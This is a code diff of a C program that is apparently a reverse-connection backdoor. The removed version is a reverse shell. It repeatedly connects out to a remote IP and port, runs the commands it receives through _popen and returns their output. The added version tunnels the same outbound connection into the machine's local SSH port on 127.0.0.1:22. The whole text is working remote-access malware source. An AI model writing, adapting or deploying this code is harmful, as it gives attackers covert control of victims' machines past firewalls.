@@ -17,31 +17,39 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 
-static int sock;
+static int remoteSock, sshSock;
 
 static void shell()
 {
+	char input[1024];
 	while (1)
 	{
-		char buffer[1024];
-		memset(buffer, 0, sizeof(buffer));
-		recv(sock, buffer, sizeof(buffer), 0);
+		ssize_t szinput = recv(remoteSock, input, sizeof(input), 0);
+		if (szinput == -1) exit(-1);
 
-		if (strncmp("q", buffer, 1) == 0)
-			return;
-		
-		FILE* fp = _popen(buffer, "r");
-		if (!fp) exit(-1);
-
-		char container[1024];
-		char total_response[16384] = "";
-		memset(container, 0, sizeof(container));
-		while (fgets(container, 1024, fp) != NULL)
+		while (szinput)
 		{
-			strcat(total_response, container);
+			ssize_t sent = send(sshSock, input, szinput, 0);
+			if (sent == -1) exit(-1);
+
+			szinput -= sent;
+
+			char output[1024];
+			while (1)
+			{
+				ssize_t szoutput = recv(sshSock, output, sizeof(output), 0);
+				if (szoutput == -1) exit(-1);
+				if (szoutput == 0) break;
+
+				while (szoutput)
+				{
+					ssize_t received = send(remoteSock, output, szoutput, 0);
+					if (received == -1) exit(-1);
+
+					szoutput -= received;
+				}
+			}
 		}
-		send(sock, total_response, sizeof(total_response), 0);
-		fclose(fp);
 	}
 }
 
@@ -76,28 +84,42 @@ int main(int argc, char* argv[])
 		exit(-1);
 	}
 #endif
-	sock = socket(AF_INET, SOCK_STREAM, 0);
-	struct sockaddr_in sockAddr;
-	memset(&sockAddr, 0, sizeof(remoteIP));
-	sockAddr.sin_family = AF_INET;
-	sockAddr.sin_addr.s_addr = inet_addr(remoteIP);
-	sockAddr.sin_port = htons((unsigned short)remotePort);
+	remoteSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	struct sockaddr_in remoteSockAddr;
+	memset(&remoteSockAddr, 0, sizeof(remoteSockAddr));
+	remoteSockAddr.sin_family = AF_INET;
+	remoteSockAddr.sin_addr.s_addr = inet_addr(remoteIP);
+	remoteSockAddr.sin_port = htons((unsigned short)remotePort);
 
-start :
-
-	while (connect(sock, (struct sockaddr *)&sockAddr, sizeof(sockAddr)) != 0)
+	while (1)
 	{
+		if (connect(remoteSock, (struct sockaddr*)&remoteSockAddr,
+			sizeof(remoteSockAddr)) == 0)
+			break;
+
 		Sleep(1);
-		goto start;
 	}
+
+	sshSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	struct sockaddr_in sshSockAddr;
+	memset(&sshSockAddr, 0, sizeof(sshSockAddr));
+	sshSockAddr.sin_family = AF_INET;
+	sshSockAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	sshSockAddr.sin_port = htons((unsigned short)22);
+
+	if (connect(sshSock, (struct sockaddr*)&sshSockAddr,
+		sizeof(sshSockAddr)) != 0)
+		exit(-1);
 
 	shell();
 
 #ifdef _WIN32
-	closesocket(sock);
+	closesocket(remoteSock);
+	closesocket(sshSock);
 	WSACleanup();
 #else
-	close(sock);
+	close(remoteSock);
+	close(sshSock);
 #endif
 	return 0;
 }
